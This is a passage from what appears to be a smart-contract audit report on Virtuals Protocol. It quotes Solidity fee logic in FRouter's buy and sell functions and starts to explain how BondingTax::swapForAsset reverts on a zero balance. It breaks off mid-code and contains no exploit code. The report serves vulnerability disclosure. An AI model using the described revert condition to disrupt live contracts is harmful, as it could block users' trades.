class=\"mtk12\"\u003esellTax_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis is used inside the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/fun/FRouter.sol#L131\"\u003e\u003ccode\u003eFRouter::buy\u003c/code\u003e\u003c/a\u003e and \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/fun/FRouter.sol#L95\"\u003e\u003ccode\u003eFRouter::sell\u003c/code\u003e\u003c/a\u003e to levy fees.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"89\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// FRouter.sol\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebuy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyRole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eEXECUTOR_ROLE\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enonReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebuyTax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etxFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etaxVault\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etxFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etxFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);          \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Fee sent to taxManager\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetAmountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIFPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIFPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etaxManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBondingTax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etaxManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswapForAsset\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();         \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Swap for Asset call\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"90\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// FRouter.sol\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esell\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enonReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyRole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eEXECUTOR_ROLE\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esellTax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etxFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etxFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etaxVault\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferAsset\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferAsset\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etxFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);                   \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Fee sent to taxManager\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etaxManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBondingTax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etaxManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswapForAsset\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();         \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Swap for Asset call\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHowever, when we have a closer look at the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/BondingTax.sol#L122\"\u003e\u003ccode\u003eBondingTax::swapForAsset\u003c/code\u003e\u003c/a\u003e function, we can observe that it reverts if the balance of the contract is 0:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"91\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// BondingTax.sol\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswapForAsset\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyBondingRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan 